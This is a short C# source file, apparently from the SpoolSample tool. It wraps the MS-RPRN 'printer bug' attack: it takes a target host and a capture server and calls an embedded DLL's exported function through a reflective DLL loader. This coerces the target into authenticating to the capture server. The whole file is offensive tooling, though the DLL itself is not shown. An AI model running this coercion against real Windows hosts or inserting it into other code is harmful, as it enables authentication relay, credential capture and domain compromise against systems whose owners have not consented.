using System;
using System.Text;
using RDI;

namespace SpoolSample
{
    public class SpoolSample
    {
        // FYI, there might be reliability issues with this. The MS-RPRN project is more reliable 
        public void ExecSpoolSample(string target, string captureserver)
        {

            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{target} \\\\{captureserver}");
            
            RDILoader.CallExportedFunction(Data.RprnDll, "DoStuff", commandBytes);
        }
    }
}
